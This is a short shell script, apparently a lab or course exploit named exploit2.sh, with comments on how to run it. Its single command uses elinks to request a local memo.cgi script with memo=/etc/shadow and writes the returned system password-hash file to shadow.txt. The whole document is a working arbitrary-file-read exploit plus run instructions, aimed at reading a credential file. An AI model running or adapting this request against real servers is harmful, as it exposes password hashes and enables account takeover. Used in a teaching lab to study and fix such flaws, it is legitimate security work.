# the following line uses a web client to submit a request to
# memo.cgi, resulting in the file being output to shadow.txt

#Instructions:
#
#In order to run the exploit, do the following steps:
#- open the terminal
#- run ./exploit2.sh
#- On my machine I didn't put my local port number,
#  but if you have trouble, just add the local port number after localhost: #.
#  Example:
#  http://localhost:(your local port number)/cgi-bin/memo.cgi?memo=/etc/shadow
#- it should create/open shadow.txt file (shadow)


elinks -dump http://localhost/cgi-bin/memo.cgi?memo=/etc/shadow > shadow.txt

# there is no 'payload2' required
